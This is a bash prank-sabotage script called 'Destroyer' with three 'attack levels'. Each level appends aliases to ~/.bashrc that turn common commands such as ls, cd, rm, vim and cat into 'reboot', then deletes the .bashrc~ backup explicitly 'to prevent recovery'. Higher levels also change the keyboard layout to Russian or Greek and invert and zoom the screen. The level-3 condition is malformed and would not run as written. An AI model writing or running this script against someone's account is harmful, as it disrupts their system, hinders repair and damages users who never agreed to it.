#!/bin/bash
clear
version='0.1.1'
default_alias="reboot"

basic_attack()
{
    for alias in "emacs" "ne" "vim" "vi" "cd" "ls"
    do
	echo "Redirecting '$alias' to '$default_alias'"
	echo "alias $alias='$default_alias'" >> ~/.bashrc
    done
    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
    rm -f ~/.bashrc~
    echo "Refreshing the bashrc"
    source ~/.bashrc
}

normal_attack()
{
    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat"
    do
	echo "Redirecting '$alias' to '$default_alias'"
	echo "alias $alias='$default_alias'" >> ~/.bashrc
    done
    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
    rm -f ~/.bashrc~
    echo "Changing the keyboard to Russian"
    setxkbmap ru
    echo "Refreshing the bashrc"
    source ~/.bashrc
}

hardcore_attack()
{
    for alias in "emacs" "ne" "vim" "vi" "cd" "ls" "nano" "xlock" "rm" "echo" "cat"
    do
	echo "Redirecting '$alias' to '$default_alias'"
	echo "alias $alias='$default_alias'" >> ~/.bashrc
    done
    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
    rm -f ~/.bashrc~
    echo "Changing the keyboard to Greek"
    setxkbmap 'pl,gr' -variant ',polytonic'
    echo "Inverting the display"
    xrandr -o inverted
    echo "Zooming in"
    xrandr --scale 5x5
    echo "Refreshing the bashrc"
    source ~/.bashrc
}

echo "+-------------------------------------------------+"
echo "|                                                 |"
echo "|               +-----------------+               |"
echo "|               |Destroyer V.$version|               |"
echo "|               +-----------------+               |"
echo "|                                                 |"
echo "|                                                 |"
echo "|         Script created by Fantin Bibas.         |"
echo "|                                                 |"
echo "|   With great power comes great responsibility   |"
echo "|                                                 |"
echo "+-------------------------------------------------+"
echo
echo "Attack levels :"
echo " (0) - Does nothing : Just quit the program"
echo " (1) - Basic attack : Add some aliases to the bashrc"
echo " (2) - Normal       : Add quite a lot of aliases + change keyboard to russian"
echo " (3) - Harcore      : Normal + play with the screen + change keyboard to greek"
echo
read -p "Please enter the level of the attack : " usr_input
echo

case $usr_input in
    0)
	echo "Bye"
	;;
    1)
	echo "Performing the basic attack ..."
	basic_attack
	;;
    2)
	echo "Performing the normal attack ..."
	normal_attack
	;;
    3)
	read -p "Are you sure you want to launch the attack level 3 ? (y/n) : " usr_input
	if [$usr_input = "y"]
	then
	    echo "Performing the hardcore attack ..."
	    hardcore_attack
	fi
	;;
esac

clear
exit
